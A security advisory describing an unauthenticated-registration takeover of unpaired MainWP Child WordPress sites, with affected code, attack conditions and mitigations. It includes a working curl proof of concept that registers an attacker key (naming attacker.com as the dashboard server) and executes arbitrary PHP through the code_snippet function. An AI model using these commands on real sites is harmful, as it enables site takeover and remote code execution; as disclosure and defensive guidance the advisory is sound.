# MWPC-2026-001: Unauthenticated Site Takeover via Registration on Default-Configured Unpaired Sites

## Severity: HIGH (CVSS ~8.1)

## Summary

An attacker can register their own RSA public key with an unpaired MainWP Child site, granting them full authenticated access to all 50+ admin-level remote management operations including arbitrary PHP execution (`eval()`), plugin installation, user management, and database backup download.

## Affected Code

**File:** `class/class-mainwp-connect.php`  
**Method:** `register_site()` (lines 81-168)  
**Entry Point:** `class/class-mainwp-child.php` line 483

## Technical Details

### Request Flow

1. Any POST request with `function=register` is intercepted in `class-mainwp-child.php:483` **before** the RSA auth check:
```php
if ( isset( $_POST['function'] ) && 'register' === $_POST['function'] ) {
    MainWP_Connect::instance()->register_site();
}
```

2. `register_site()` performs these checks:
   - **Already-paired check (line 100):** If `mainwp_child_pubkey` exists AND `verify_reconnect_for_current_connect()` returns false, registration is blocked (unless password auth is provided).
   - **Unique ID check (lines 109-117):** Only checked if `get_site_unique_id()` returns a non-empty string. **Default is empty string.**
   - **Credential check via `is_verified_register()` (line 129):** Calls `is_enabled_user_passwd_auth()` first. If password auth is enabled (the default), it requires `$_POST['userpwd']` to match the admin's password.

### Attack Conditions

The attack succeeds when ALL of these are true:
1. Site has MainWP Child installed but not yet paired (no `mainwp_child_pubkey` in options)
2. No unique security ID configured (default)
3. Attacker knows a valid administrator username
4. **One of:**
   - Attacker knows the admin password, OR
   - Password auth is explicitly disabled (`mainwp_child_user_enable_passwd_auth_connect` = `'0'`), OR
   - Attacker can brute-force the password (no rate limiting on this endpoint)

### Post-Exploitation

Once the attacker's public key is registered, they can sign requests for ANY callable function including:
- `code_snippet` -> `eval()` of arbitrary PHP code (RCE)
- `uploader_action` -> arbitrary file write to webroot
- `installplugintheme` -> install malicious plugin (RCE)
- `newadminuser` -> create backdoor admin account
- `backup_full` -> download full site backup including wp-config.php

## Proof of Concept

```bash
# Step 1: Generate RSA keypair
openssl genrsa -out attacker.pem 2048
openssl rsa -in attacker.pem -pubout -out attacker.pub

# Step 2: Recon - check if site is unpaired
curl -X POST https://target.com/ -d "function=stats"
# If returns version info -> unpaired, vulnerable

# Step 3: Register attacker's public key (requires admin password on default config)
PUBKEY=$(cat attacker.pub | base64 -w0)
curl -X POST https://target.com/ \
  -d "function=register" \
  -d "user=admin" \
  -d "pubkey=$PUBKEY" \
  -d "userpwd=admin_password" \
  -d "server=https://attacker.com"

# Step 4: Sign and execute arbitrary PHP
NONCE=$(date +%s)
SIGNATURE=$(echo -n "code_snippet${NONCE}" | openssl dgst -sha256 -sign attacker.pem | base64 -w0)
curl -X POST https://target.com/ \
  -d "function=code_snippet" \
  -d "mainwpsignature=$SIGNATURE" \
  -d "nonce=$NONCE" \
  -d "code=system('id');"
```

## Mitigations

1. **Always set a unique security ID** in MainWP Child settings before pairing
2. Keep password authentication enabled (the default)
3. Use strong admin passwords
4. Consider adding rate limiting to the registration endpoint
5. Consider requiring the unique security ID by default rather than making it optional

## Timeline Window

The vulnerability window exists between plugin activation and successful Dashboard pairing. On sites where the plugin is installed but the admin hasn't completed pairing, this window may persist indefinitely.
